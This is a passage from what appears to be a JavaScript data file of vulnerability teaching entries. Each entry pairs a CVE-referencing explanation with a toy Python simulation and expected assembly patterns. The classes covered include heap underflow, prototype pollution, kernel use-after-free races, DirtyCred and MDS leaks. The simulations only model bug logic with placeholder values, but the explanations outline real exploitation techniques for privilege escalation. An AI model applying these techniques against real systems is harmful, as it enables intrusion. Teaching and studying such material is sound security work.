        self.writes += 1
        return self.writes

phys = PhysicalMemory(4294967296)
rogue = DMADevice(1094795585)
stolen = rogue.scan_memory(phys, 4)
rogue.inject_payload(phys, 3735928559)
result = phys.kernel_code + stolen
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads kernel credentials (0xCAFEBABE) and encryption keys (0x12345678) into stack slots representing physical memory regions; the scan loop\'s addl sweeps across all offsets without any IOMMU bounds check — inject_payload\'s movl writes 0xDEADBEEF directly into the kernel code slot with no permission guard, achieving full physical memory read-write via a rogue PCIe device',
    },
  },
  {
    id: 'int-truncation',
    name: 'INTEGER TRUNCATION',
    severity: 'CRITICAL',
    category: 'Arithmetic',
    description: 'Wide integer silently truncated to a narrower type for allocation size, while the full untruncated value drives the copy — massive heap overflow.',
    explanation:
      'Integer truncation (CWE-197) occurs when a value in a wider type (e.g. 64-bit size_t) is cast to a ' +
      'narrower type (e.g. 16-bit uint16_t) for a buffer allocation size. The high bits are silently discarded: ' +
      'a value like 65600 (0x10040) becomes 64 (0x0040) when stored in a 16-bit field. The program allocates a ' +
      '64-byte buffer but then copies 65600 bytes using the original untruncated value — a catastrophic heap overflow ' +
      'that corrupts adjacent objects, function pointers, and allocator metadata. Unlike integer overflow (CWE-190) ' +
      'where a value wraps past MAX, truncation discards upper bits during a width-narrowing cast — the arithmetic ' +
      'never overflows, but the stored result is silently wrong. ' +
      'CVE-2025-49679 (Windows Shell) exploited 64-to-32-bit truncation in file-path handling to corrupt memory ' +
      'addresses and escalate privileges. CVE-2025-3277 (SQLite) truncated an extremely large input size during ' +
      'allocation, producing a tiny buffer while the subsequent write used the original untruncated length — a ~4GB ' +
      'heap overflow. CVE-2025-53723 (Windows Hyper-V) exploited numeric truncation in the virtualization stack for ' +
      'incorrect memory handling. CVE-2025-21333 (Windows Kernel vkrnlintvsp.sys) truncated a 64-bit value past ' +
      'the LONG range, causing incorrect buffer sizing in a kernel driver. FastNetMon\'s AS_PATH parser stored a ' +
      'computed attribute_length in a uint8_t — any AS_PATH exceeding 63 ASNs silently truncated the length to ' +
      'its low 8 bits, allocating a tiny buffer while writing the full untruncated data. ' +
      'In the assembly, `cmpl` checks the truncated alloc_size (64) against the buffer capacity, which trivially ' +
      'passes; `imull` then multiplies the full untruncated value (65600) by 4 to compute the copy length — ' +
      'the resulting offset far exceeds the allocated region, and `movl` writes 0xDEADBEEF into the adjacent ' +
      'object\'s handler field via the heap spill.',
    code:
`# CVE pattern: 64-bit size truncated to 16-bit — tiny alloc, massive copy
class SizeCalc:
    def __init__(self, input_size):
        self.full_size = input_size
        self.alloc_size = 0
        self.copy_len = 0
        self.overflow_bytes = 0

    def truncate_width(self):
        if self.full_size > 65535:
            self.alloc_size = self.full_size - 65536
        else:
            self.alloc_size = self.full_size
        return self.alloc_size

    def do_copy(self):
        self.copy_len = self.full_size * 4
        if self.copy_len > self.alloc_size:
            self.overflow_bytes = self.copy_len - self.alloc_size
        return self.overflow_bytes

class Adjacent:
    def __init__(self, handler, refcount):
        self.handler = handler
        self.refcount = refcount
        self.corrupted = 0

    def check_integrity(self):
        result = self.handler + self.refcount
        return result

calc = SizeCalc(65600)
tiny_buf = calc.truncate_width()
overflow = calc.do_copy()
victim = Adjacent(4196352, 1)
victim.handler = 3735928559
victim.corrupted = 1
hijacked = victim.check_integrity()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'imull', 'movl'],
      description: 'cmpl checks the truncated alloc_size (64) against the buffer capacity — the guard trivially passes because the high bits were silently discarded during the width-narrowing cast; imull then multiplies the full untruncated value (65600) by 4 to compute the copy length, producing an offset that far exceeds the allocation; movl writes 0xDEADBEEF into the adjacent object\'s handler field via the heap spill, hijacking the next virtual dispatch',
    },
  },
  {
    id: 'buffer-underflow',
    name: 'BUFFER UNDERFLOW',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Negative index or pointer decrement writes before the buffer start, corrupting heap metadata or stack-saved registers that precede the allocation.',
    explanation:
      'Buffer underflow (CWE-124 / CWE-786) occurs when a write operation targets memory addresses before ' +
      'the beginning of an allocated buffer — the mirror image of a buffer overflow. A negative index, an ' +
      'unchecked pointer decrement, or arithmetic underflow in offset calculation causes the write to land ' +
      'in heap allocator metadata (prev_size, fd/bk pointers) or stack-saved registers that lie at lower ' +
      'addresses than the buffer base. Corrupting glibc\'s malloc metadata enables the classic unsafe unlink ' +
      'exploit: the attacker forges fd and bk pointers so that free() performs an arbitrary write during ' +
      'chunk consolidation. ' +
      'CVE-2023-0179 (Linux kernel nftables, CVSS 7.8) exploited an integer underflow in nft_payload_copy_vlan — ' +
      'a crafted VLAN header caused the offset to wrap negative, writing before the payload buffer on the kernel ' +
      'stack and achieving local privilege escalation to root via arbitrary code execution. ' +
      'CVE-2026-44631 (Apache HTTP Server 2.4.0–2.4.67) is a heap underwrite in ap_regname caused by a signed ' +
      'char overflow in regex configuration parsing, enabling remote code execution. ' +
      'CVE-2024-21762 (FortiOS SSL VPN, CVSS 9.6, CISA KEV) used a pre-buffer out-of-bounds write primitive ' +
      'for unauthenticated remote code execution, actively exploited by state-sponsored actors before public ' +
      'disclosure. ' +
      'In the assembly, cmpl checks the index but allows negative values through the else branch; movl writes ' +
      'the attacker\'s value into the fd_ptr/bk_ptr fields that precede the data slots on the stack; addl in ' +
      'unsafe_unlink sums the forged pointers — in a real heap exploit, free() dereferences these corrupted ' +
      'pointers during chunk consolidation, achieving an arbitrary write primitive.',
    code:
`# CVE pattern: negative index underflows buffer — corrupts heap metadata
class HeapChunk:
    def __init__(self, capacity):
        self.prev_size = 0
        self.chunk_size = capacity * 8
        self.fd_ptr = 4196352
        self.bk_ptr = 4196608
        self.slot0 = 0
        self.slot1 = 0
        self.write_count = 0

    def write_at(self, index, value):
        if index >= 0:
            if index == 0:
                self.slot0 = value
            else:
                self.slot1 = value
        else:
            if index == 0 - 1:
                self.bk_ptr = value
            else:
                self.fd_ptr = value
        self.write_count += 1
        return self.write_count

    def unsafe_unlink(self):
        result = self.fd_ptr + self.bk_ptr
        return result

chunk = HeapChunk(16)
chunk.write_at(0, 42)
chunk.write_at(1, 84)
neg = 0 - 1
chunk.write_at(neg, 3735928559)
deep_neg = 0 - 2
chunk.write_at(deep_neg, 1094795585)
hijacked = chunk.unsafe_unlink()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl checks the index but allows negative values to reach the else branch; movl writes the attacker values (0xDEADBEEF, 0x41414141) into fd_ptr and bk_ptr fields that precede the buffer data slots — addl in unsafe_unlink sums the forged pointers, simulating the arbitrary write that glibc\'s free() performs during unsafe chunk consolidation',
    },
  },
  {
    id: 'untrusted-ptr-deref',
    name: 'UNTRUSTED POINTER DEREF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Kernel dereferences an attacker-supplied pointer without validation, granting an arbitrary memory read/write primitive from user context.',
    explanation:
      'Untrusted pointer dereference (CWE-822) occurs when a kernel syscall handler or driver IOCTL receives a ' +
      'pointer from user-mode and dereferences it without verifying the address falls within a valid, authorized ' +
      'memory region. Unlike buffer overflows that reach adjacent memory incrementally, untrusted pointer dereference ' +
      'gives the attacker surgical precision: they supply the exact kernel address to read or write, bypassing all ' +
      'spatial bounds checking. ' +
      'CVE-2026-40369 (Windows kernel, CVSS 7.8) is the textbook example: NtQuerySystemInformation invoked with ' +
      'info class 253 (SystemProcessInformationExtension) and buffer length zero passes a caller-controlled pointer ' +
      'into ExpGetProcessInformation without validation, creating an arbitrary 12-byte kernel write from any ' +
      'standard user context — enabling browser sandbox escape from all major render processes. ' +
      'CVE-2025-49661 (Windows AFD.sys, CVSS 7.8) exploited the same class in the WinSock kernel driver: user-mode ' +
      'pointers passed to the Ancillary Function Driver were dereferenced in ring 0 without ProbeForRead/ProbeForWrite ' +
      'validation, escalating to SYSTEM. CVE-2025-47985 (Windows Event Tracing) allowed crafted LPC messages with ' +
      'unvalidated pointers to perform arbitrary kernel read/write. CWE-822 has appeared in over a dozen Windows ' +
      'kernel CVEs across 2025-2026 alone, making it one of the most actively exploited vulnerability classes ' +
      'in modern operating systems. ' +
      'In the assembly, cmpl in query_info checks buf_len but the zero-length bypass skips validation entirely; ' +
      'movl loads the attacker-supplied user_ptr offset and writes to the computed stack slot without any ' +
      'ProbeForWrite guard — the else branch sets priv_level to 0, simulating the kernel token corruption.',
    code:
`# CVE pattern: user-supplied pointer dereferenced without validation
class KernelMemory:
    def __init__(self, capacity):
        self.capacity = capacity
        self.counter0 = 0
        self.counter1 = 0
        self.token_addr = 4196352
        self.priv_level = 1000

    def increment_at(self, offset):
        if offset == 0:
            self.counter0 += 1
        elif offset == 1:
            self.counter1 += 1
        elif offset == 2:
            self.token_addr += 1
        else:
            self.priv_level = 0
        return offset

    def read_priv(self):
        result = self.priv_level + self.token_addr
        return result

class SyscallHandler:
    def __init__(self, info_class):
        self.info_class = info_class
        self.buf_len = 0
        self.validated = 0

    def query_info(self, kmem, user_ptr):
        if self.buf_len > 0:
            self.validated = 1
        kmem.increment_at(user_ptr)
        return self.validated

kmem = KernelMemory(4096)
handler = SyscallHandler(253)
handler.buf_len = 0
handler.query_info(kmem, 0)
attacker_ptr = 99
handler.query_info(kmem, attacker_ptr)
leaked = kmem.read_priv()
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'cmpl checks buf_len > 0 but the zero-length bypass skips validation entirely; movl loads the attacker-supplied user_ptr offset and writes to the computed stack slot without any ProbeForWrite guard — the else branch sets priv_level to 0, simulating the arbitrary kernel write that corrupts security tokens at an attacker-chosen address',
    },
  },
  {
    id: 'proto-pollution',
    name: 'PROTOTYPE POLLUTION',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'Attacker-controlled key merges into Object.prototype, poisoning all downstream objects and escalating to remote code execution.',
    explanation:
      'Prototype pollution (CWE-1321) exploits JavaScript\'s prototype chain: when a recursive merge or deep-clone ' +
      'function processes attacker-supplied keys like __proto__ or constructor.prototype, the assigned value propagates ' +
      'to Object.prototype — the root prototype inherited by every JavaScript object. Any subsequent property lookup ' +
      'on any object that lacks its own definition for the poisoned key resolves to the attacker\'s value, silently ' +
      'corrupting authentication checks (isAdmin becomes true), template engine options (enabling code evaluation), ' +
      'or child_process spawn arguments (injecting shell commands). ' +
      'CVE-2025-55182 (React2Shell, CVSS 10.0) is the most impactful example: React Server Components\' Flight ' +
      'protocol decoded attacker-supplied __proto__ keys during request parsing, enabling unauthenticated RCE on ' +
      'every Next.js application using server components — a single HTTP request poisons the server process and ' +
      'executes arbitrary code without authentication. CVE-2025-66478 extended the attack to Next.js App Router. ' +
      'CVE-2019-10744 (Lodash, CVSS 9.1) and CVE-2019-7609 (Kibana) both achieved RCE through prototype pollution ' +
      'chained with template engines or child_process.spawn — the Kibana exploit was used in the wild for cryptomining. ' +
      'In the assembly, movl stores the attacker\'s poisoned value (0xDEADBEEF) into the base_proto field via merge_key; ' +
      'resolve_prop\'s cmpl checks whether own_value > 0, and when it is not, movl reads from the poisoned base_proto ' +
      'slot — every object without its own property inherits the attacker\'s value, turning auth checks into guaranteed bypass.',
    code:
`# CVE pattern: __proto__ key poisons all objects — auth bypass to RCE
class ProtoChain:
    def __init__(self):
        self.base_proto = 0
        self.polluted = 0

    def merge_key(self, key_type, value):
        if key_type == 1:
            self.base_proto = value
            self.polluted = 1
        return self.polluted

    def resolve_prop(self, own_value):
        if own_value > 0:
            result = own_value
        else:
            result = self.base_proto
        return result

class UserObj:
    def __init__(self, role):
        self.role = role
        self.is_admin = 0
        self.token = 0

    def check_admin(self, proto):
        if self.is_admin > 0:
            self.token = 4196352
        else:
            resolved = proto.resolve_prop(self.is_admin)
            self.token = resolved
        return self.token

proto = ProtoChain()
proto.merge_key(1, 3735928559)
user = UserObj(100)
hijacked = user.check_admin(proto)
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl stores the attacker\'s poisoned value (0xDEADBEEF) into the base_proto slot via merge_key; cmpl in resolve_prop checks own_value > 0 and falls through to the else branch — movl reads from the poisoned base_proto slot, so every object without its own property inherits the attacker\'s value, turning authentication checks into guaranteed bypass',
    },
  },
  {
    id: 'msg-oob-uaf',
    name: 'MSG_OOB SOCKET UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Consumed out-of-band socket buffers linger in the receive queue as boundary markers, allowing a stale recv to dereference freed kernel memory.',
    explanation:
      'CVE-2025-38236 (CWE-416) exploits a subtle flaw in the Linux kernel\'s AF_UNIX MSG_OOB handling, ' +
      'discovered by Jann Horn of Google Project Zero. When out-of-band data is sent on a UNIX domain ' +
      'stream socket, the kernel stores it in an sk_buff (socket buffer) on the receive queue. After the ' +
      'receiver reads the OOB data with recv(MSG_OOB), the skb is not removed — it remains in the queue ' +
      'as a boundary marker with its data length zeroed. When multiple consecutive OOB sends and receives ' +
      'occur, the queue accumulates consumed OOB skbs with zero length. A subsequent normal recv() walks ' +
      'the queue, hits a consumed OOB skb, and manage_oob() returns the next skb; ' +
      'unix_stream_read_generic() then reads and frees the not-yet-consumed OOB skb. The final ' +
      'recv(MSG_OOB) dereferences the now-freed skb — a classic use-after-free. This bug is particularly ' +
      'dangerous because AF_UNIX sockets are accessible from within sandboxed processes: Jann Horn ' +
      'demonstrated exploitation directly from Chrome\'s renderer sandbox, achieving full kernel-level ' +
      'code execution without any user interaction. The SO_PEEK_OFF code path does not expect ' +
      'unix_skb_len(skb) to be 0, which is exactly the state of a consumed OOB boundary marker, creating ' +
      'the mismatch that leads to the use-after-free. The fix modifies unix_stream_recv_urg() to check ' +
      'whether the previous skb is a consumed OOB skb and frees it before processing the current OOB ' +
      'message, preventing the stale reference chain. ' +
      'In the assembly, movl stores OOB data into the oob_data field via send_oob; recv_stream\'s cmpl ' +
      'checks consumed == 1 and zeroes oob_data (simulating sk_buff free); recv_oob_stale\'s movl reads ' +
      'from the same zeroed slot — at runtime the freed sk_buff region holds attacker-controlled data ' +
      'from heap spray, yielding kernel code execution from inside a sandbox.',
    code:
`# CVE pattern: MSG_OOB consumed skb stays queued — stale recv triggers UAF
class OobSocket:
    def __init__(self):
        self.oob_data = 0
        self.consumed = 0
        self.freed = 0
        self.queue_len = 0

    def send_oob(self, value):
        self.oob_data = value
        self.consumed = 0
        self.queue_len += 1
        return self.queue_len

    def recv_oob(self):
        result = self.oob_data
        self.consumed = 1
        return result

    def recv_stream(self):
        if self.consumed == 1:
            self.freed = 1
            self.oob_data = 0
            self.queue_len -= 1
        return self.queue_len

    def recv_oob_stale(self):
        stale = self.oob_data
        return stale

sock = OobSocket()
sock.send_oob(3735928559)
sock.recv_oob()
sock.send_oob(3405691582)
sock.recv_oob()
freed = sock.recv_stream()
dangling = sock.recv_oob_stale()
print(dangling)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
      description: 'movl stores OOB data via send_oob, then recv_stream\'s cmpl checks consumed == 1 and zeroes oob_data (simulating sk_buff free); recv_oob_stale\'s movl reads from the same zeroed slot — at runtime the freed sk_buff contains attacker-controlled heap spray data, yielding kernel code execution from inside a sandbox',
    },
  },
  {
    id: 'futex-requeue-race',
    name: 'FUTEX REQUEUE RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Race between futex requeue and lock release corrupts the PI waiter list, yielding a kernel use-after-free for privilege escalation.',
    explanation:
      'Futex (Fast Userspace Mutex) requeue race conditions exploit the Linux kernel\'s most complex ' +
      'synchronization primitive. The futex_requeue() syscall atomically moves waiters from one futex ' +
      'queue to another — but when combined with Priority Inheritance (PI) futexes, the operation must ' +
      'also transfer lock ownership. A race between a requeue operation on one thread and a lock release ' +
      'on another can leave a waiter\'s task struct referenced in the PI state after the task has exited ' +
      'and its kernel stack freed — a use-after-free on the kernel stack itself. ' +
      'CVE-2014-3153 (Towelroot, CVSS 7.8) exploited a logical flaw in futex_requeue() that failed to ' +
      'verify source and destination futex addresses were distinct: requeueing a futex onto itself corrupted ' +
      'the waiter list, giving geohot an arbitrary kernel write that rooted every Android device with a ' +
      'kernel built before June 2014. CVE-2021-3347 (CVSS 7.8) exploited PI futex fault handling where a ' +
      'page fault during the requeue left the kernel in inconsistent state — the PI lock\'s owner field ' +
      'referenced a freed task, and the next unlock wrote through the dangling pointer. CVE-2025-39977 ' +
      '(CVSS 7.0) demonstrated the class persists: a timeout or signal during requeue-PI completion caused ' +
      'futex_wait_requeue_pi() to exit without lock_ptr synchronization, producing yet another UAF on the ' +
      'waiter\'s kernel stack. The attack surface is inherent to the futex design — userspace controls both ' +
      'the futex addresses and the timing of concurrent operations, giving the attacker direct influence over ' +
      'the race window. ' +
      'In the assembly, addl increments waiter_count during requeue while a concurrent release_lock zeroes ' +
      'pi_owner and lock_ptr via movl — the subsequent read of lock_ptr in race_release returns 0 (the freed ' +
      'reference), but the attacker sprays the freed stack slot with 0xDEADBEEF via movl to pi_owner, and ' +
      'addl in the final expression dereferences the stale pointer value.',
    code:
`# CVE pattern: futex requeue race — PI waiter list UAF on kernel stack
class FutexQueue:
    def __init__(self, key):
        self.key = key
        self.waiter_count = 0
        self.pi_owner = 0
        self.lock_ptr = 0

    def add_waiter(self, tid):
        self.waiter_count += 1
        self.lock_ptr = tid
        return self.waiter_count

    def release_lock(self):
        self.pi_owner = 0
        self.lock_ptr = 0
        return self.pi_owner

class Requeuer:
    def __init__(self, src, dst):
        self.src_key = src
        self.dst_key = dst
        self.moved = 0
        self.stale_ref = 0

    def requeue_waiters(self, src_q, dst_q, count):
        i = 0
        while i < count:
            src_q.waiter_count -= 1
            dst_q.waiter_count += 1
            self.moved += 1
            i += 1
        return self.moved

    def race_release(self, src_q):
        src_q.release_lock()
        self.stale_ref = src_q.lock_ptr + 1
        return self.stale_ref

src = FutexQueue(1000)
dst = FutexQueue(2000)
src.add_waiter(4196352)
src.add_waiter(4196608)
src.add_waiter(4196864)
requeuer = Requeuer(src.key, dst.key)
requeuer.requeue_waiters(src, dst, 2)
requeuer.race_release(src)
src.pi_owner = 3735928559
dangling = src.pi_owner + src.lock_ptr
print(dangling)
`,
    badAsm: {
      patterns: ['addl', 'movl'],
      description: 'addl increments waiter_count during requeue while a concurrent release_lock\'s movl zeroes pi_owner and lock_ptr — race_release reads the freed lock_ptr (0) through a stale reference; the attacker sprays 0xDEADBEEF into pi_owner via movl, and the final addl sums the dangling pointer value with the freed slot for kernel stack corruption',
    },
  },
  {
    id: 'mds-zombieload',
    name: 'MDS ZOMBIELOAD',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Faulting load forwards stale data from CPU-internal fill buffers, leaking secrets across processes, VMs, and SGX enclaves via cache timing.',
    explanation:
      'Microarchitectural Data Sampling (MDS / CWE-200) is a family of hardware vulnerabilities in Intel CPUs that ' +
      'leak data from CPU-internal buffers — Line Fill Buffers, Store Buffers, and Load Ports — that are never ' +
      'architecturally visible to software. Unlike Spectre (which exploits branch prediction), MDS exploits the ' +
      'CPU\'s data-forwarding logic: when a faulting or assisted load occurs, the microarchitecture speculatively ' +
      'forwards stale data from these internal buffers before aborting the faulted instruction. The attacker encodes ' +
      'the leaked byte into a cache line via a dependent load on a probe array, then uses Flush+Reload timing to ' +
      'recover it — identical to Meltdown\'s extraction step but targeting internal buffers instead of L1D cache. ' +
      'ZombieLoad (CVE-2018-12130 / MFBDS) targets Line Fill Buffers and is the most severe variant, leaking data ' +
      'across OS processes, virtual machines, and SGX enclaves at rates up to 2.5 KB/s. RIDL (CVE-2018-12127 / MLPDS) ' +
      'targets Load Ports; Fallout (CVE-2018-12126 / MSBDS) targets Store Buffers. ZombieLoad v2 / TAA ' +
      '(CVE-2019-11135) bypassed Intel\'s hardware MDS mitigations on Cascade Lake CPUs by exploiting TSX ' +
      'Asynchronous Abort to access fill buffer contents from within a transactional region. Researchers demonstrated ' +
      'real-time keystroke recovery, ASLR derandomization, and TLS session key extraction across VM boundaries. Intel ' +
      'has no complete hardware fix; software mitigation requires the VERW instruction to flush internal buffers on ' +
      'every privilege transition and optionally disabling Hyper-Threading, incurring up to 20% performance loss. ' +
      'In the assembly, movl loads a faulting address (0x0) that triggers a microcode assist; the CPU speculatively ' +
      'forwards stale data from the fill buffer into the probe index calculation — imull multiplies the leaked byte ' +
      'by 256 (cache line size) to select a probe array line, and addl sums the timing result without any VERW ' +
      'serialization between the fault and the dependent load.',
    code:
`# CVE pattern: faulting load leaks fill-buffer data via cache timing
class FillBuffer:
    def __init__(self, capacity):
        self.capacity = capacity
        self.stale_data = 3405691582
        self.tls_key = 305419896
        self.aslr_base = 4196352
        self.slot_count = 0

    def load_victim(self, secret):
        self.stale_data = secret
        self.slot_count += 1
        return self.slot_count

class Attacker:
    def __init__(self, probe_size):
        self.probe_size = probe_size
        self.leaked_byte = 0
        self.probe_index = 0
        self.timing_hit = 0

    def faulting_load(self, fb):
        self.leaked_byte = fb.stale_data
        self.probe_index = self.leaked_byte * 256
        return self.probe_index

    def flush_reload(self):
        self.timing_hit = self.probe_index + self.leaked_byte
        return self.timing_hit

fb = FillBuffer(64)
fb.load_victim(3405691582)
fb.load_victim(305419896)
attacker = Attacker(65536)
leaked = attacker.faulting_load(fb)
result = attacker.flush_reload()
print(result)
`,
    badAsm: {
      patterns: ['movl', 'imull'],
      description: 'movl loads stale data from the fill buffer slot after the victim\'s value has been evicted; imull multiplies the leaked byte by 256 to compute the probe array cache line index — no VERW serialization instruction appears between the faulting load and the dependent access, leaving the transient execution window open for Flush+Reload extraction across VM and process boundaries',
    },
  },
  {
    id: 'userfaultfd-race',
    name: 'USERFAULTFD RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Userfaultfd blocks kernel copy_from_user mid-syscall, giving an attacker thread an unbounded race window to free the target object and achieve use-after-free.',
    explanation:
      'Userfaultfd race exploitation (CWE-362 / CWE-416) weaponizes the Linux kernel\'s userfaultfd mechanism — ' +
      'designed to let userspace handle page faults — as a deterministic race-condition amplifier. The attacker ' +
      'registers a memory region with userfaultfd, then triggers a syscall whose copy_from_user() reads from that ' +
      'region. When the kernel touches the registered page, the page fault is forwarded to the attacker\'s uffd ' +
      'handler thread, which blocks the kernel thread indefinitely. While the kernel is frozen mid-copy, the ' +
      'attacker frees the target kernel object (buffer, socket, file struct) from a second thread, then resolves ' +
      'the fault — the kernel resumes copy_from_user into the now-freed object, producing a deterministic ' +
      'use-after-free with no timing uncertainty. This transforms normally-microsecond race windows into ' +
      'arbitrarily long ones, making otherwise-unexploitable races trivially reliable. ' +
      'CVE-2021-22555 (Linux Netfilter, CVSS 7.8) used userfaultfd to deterministically trigger a heap out-of-bounds ' +
      'write in Netfilter\'s x_tables compat layer, achieving container escape and root from an unprivileged user. ' +
      'CVE-2022-29582 (Linux io_uring) exploited a timeout UAF by using userfaultfd to pause the kernel during ' +
      'io_uring request processing while a second thread cancelled the timer, freeing the request struct mid-copy. ' +
      'CVE-2021-26708 (Linux vsock, CVSS 7.0) leveraged userfaultfd to hold the kernel during virtio transport ' +
      'operations while racing to corrupt vsock socket state from another thread. CVE-2019-18683 (V4L2) and ' +
      'CVE-2020-27786 (MIDI) similarly used userfaultfd to widen race windows for reliable kernel exploitation. ' +
      'Kernel 5.11+ restricts unprivileged userfaultfd via /proc/sys/vm/unprivileged_userfaultfd=0, but many ' +
      'distributions still ship with it enabled, and the FUSE-based "Minotaur" variant achieves the same effect. ' +
      'In the assembly, begin_copy\'s movl sets in_copy=1 marking the kernel as mid-syscall; fault_block\'s movl ' +
      'sets blocked=1 freezing the kernel thread — free_and_resolve\'s movl then zeroes the buffer\'s data and size ' +
      'fields while the kernel is paused. When the copy resumes, movl writes 0xDEADBEEF into the freed object\'s ' +
      'stack slot, and addl in the stale read sums attacker-controlled data from the recycled memory.',
    code:
`# CVE pattern: userfaultfd blocks copy_from_user — free object in race window
class KernelBuf:
    def __init__(self, size, data):
        self.size = size
        self.data = data
        self.freed = 0
        self.in_copy = 0

    def begin_copy(self):
        self.in_copy = 1
        return self.in_copy

    def complete_copy(self, user_val):
        self.data = user_val
        self.in_copy = 0
        return self.data

class UffdHandler:
    def __init__(self, page_addr):
        self.page_addr = page_addr
        self.blocked = 0
        self.resolved = 0

    def fault_block(self):
        self.blocked = 1
        return self.blocked

    def free_and_resolve(self, buf):
        buf.data = 0
        buf.size = 0
        buf.freed = 1
        self.resolved = 1
        return self.resolved

kbuf = KernelBuf(256, 4196352)
uffd = UffdHandler(1048576)
kbuf.begin_copy()
uffd.fault_block()
uffd.free_and_resolve(kbuf)
kbuf.data = 3735928559
stale = kbuf.data + kbuf.size
print(stale)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl sets in_copy=1 marking the kernel mid-syscall then fault_block\'s movl sets blocked=1 freezing the thread; free_and_resolve\'s movl zeroes data and size in the freed buffer while the kernel is paused — after the fault resolves, movl writes 0xDEADBEEF into the freed slot and addl sums the attacker-controlled value with the zeroed size, producing a stale read from recycled memory',
    },
  },
  {
    id: 'dirty-cred',
    name: 'DIRTYCRED CREDENTIAL SWAP',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Kernel UAF frees an unprivileged credential object; the slab allocator hands the same slot to a privileged allocation, and the task\'s dangling pointer now references root credentials.',
    explanation:
      'DirtyCred (CWE-416 / CWE-269) is a kernel exploitation technique presented at ACM CCS 2022 and Black Hat USA 2022 ' +
      'by Zhenpeng Lin (Northwestern University) that transforms any kernel use-after-free or double-free into a privilege ' +
      'escalation — without needing KASLR bypass, heap address leaks, or ROP chains. The attack has two variants: ' +
      'Task credential swap targets the struct cred in the dedicated cred_jar slab cache: the attacker triggers a UAF to ' +
      'free a task\'s unprivileged cred, then races a privileged process (e.g. su or sshd) to allocate a new cred that fills ' +
      'the freed slot — the victim task\'s dangling cred pointer now references uid=0, cap=0xFFFFFFFF (CAP_ALL). ' +
      'File struct swap targets struct file in the filp slab cache: the attacker opens a read-only file, frees the struct ' +
      'file via UAF, then opens /etc/shadow — the original file descriptor now points to the privileged file\'s struct, ' +
      'granting write access. Because the swap is data-only (no code pointers are corrupted), SMEP, SMAP, and CFI are all ' +
      'bypassed. CVE-2021-4154 (cgroup v1 UAF) and CVE-2022-2588 (cls_route double-free, CVSS 7.8) were demonstrated; ' +
      'CVE-2023-3269 (StackRot) and CVE-2024-1086 (netfilter nf_tables) provide the same UAF primitive for DirtyCred. ' +
      'In the assembly, movl zeros the freed cred fields (uid, gid, cap); realloc_privileged\'s movl writes 0xFFFFFFFF ' +
      'into the cap slot — the same stack offset — and the task\'s addl in check_priv sums the now-root uid (0) with ' +
      'CAP_ALL, confirming privilege escalation without corrupting a single code pointer.',
    code:
`# CVE pattern: UAF frees unprivileged cred — slab reuse fills slot with root cred
class Cred:
    def __init__(self, uid, gid, cap):
        self.uid = uid
        self.gid = gid
        self.cap = cap
        self.refcount = 1

class Task:
    def __init__(self, pid, uid, cap):
        self.pid = pid
        self.cred_uid = uid
        self.cred_cap = cap
        self.swapped = 0

    def check_priv(self):
        result = self.cred_uid + self.cred_cap
        return result

class SlabCache:
    def __init__(self, capacity):
        self.capacity = capacity
        self.alloc_count = 0
        self.last_freed = 0

    def free_cred(self, cred):
        cred.uid = 0
        cred.gid = 0
        cred.cap = 0
        cred.refcount = 0
        self.last_freed = 1
        return self.last_freed

    def realloc_privileged(self, cred):
        cred.uid = 0
        cred.gid = 0
        cred.cap = 4294967295
        cred.refcount = 1
        self.alloc_count += 1
        return self.alloc_count

unpriv = Cred(1000, 1000, 0)
task = Task(1337, unpriv.uid, unpriv.cap)
slab = SlabCache(64)
slab.free_cred(unpriv)
slab.realloc_privileged(unpriv)
task.cred_uid = unpriv.uid
task.cred_cap = unpriv.cap
task.swapped = 1
hijacked = task.check_priv()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl zeros the freed credential fields (uid, gid, cap) in free_cred; realloc_privileged\'s movl writes 0xFFFFFFFF (CAP_ALL) into the same cap stack offset — the task\'s dangling reference now reads root credentials, and addl in check_priv sums uid=0 with cap=0xFFFFFFFF confirming privilege escalation without corrupting any code pointers',
    },
  },
  {
    id: 'use-after-realloc',
    name: 'USE-AFTER-REALLOC',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Buffer resized by realloc shrinks or moves, but stale pointers still reference the old size/location — writes through them corrupt adjacent heap metadata or freed memory.',
    explanation:
      'Use-after-realloc (CWE-416 adjacent) is a subtle variant of use-after-free that occurs when realloc() ' +
      'shrinks or relocates a buffer but existing pointers still reference the original size or address. ' +
      'When realloc reduces a buffer from N to M bytes (M < N), the allocator may free the tail portion or ' +
      'move the data entirely; either way, code that cached the old capacity continues writing up to N bytes, ' +
      'overflowing past the new M-byte boundary into adjacent heap objects or freed memory. ' +
      'CVE-2023-29491 (ncurses, CVSS 7.8) is the textbook example: the terminfo parser calls realloc() to ' +
      'shrink ptr->Strings based on an attacker-controlled str_count field from a malicious .terminfo file, ' +
      'then immediately writes beyond the new boundary — Microsoft\'s analysis confirmed heap corruption ' +
      'enabling local privilege escalation via any setuid ncurses application. ' +
      'CVE-2023-25136 (OpenSSH 9.1, pre-auth) exposed a double-free during options.kex_algorithms handling ' +
      'where a failed realloc path freed the buffer twice, giving an unauthenticated remote attacker heap ' +
      'corruption before authentication — rated critical for its pre-auth attack surface. ' +
      'CVE-2026-4446 (Chrome WebRTC) exploited a use-after-free where WebRTC objects were freed and the ' +
      'underlying memory reallocated for other purposes while stale references remained, achieving RCE in ' +
      'the renderer process. The pattern is endemic in C codebases that cache buffer pointers across realloc ' +
      'calls — any resize invalidates every alias, but compilers cannot warn about it. ' +
      'In the assembly, movl stores values using the old capacity as the bound; after realloc_shrink reduces ' +
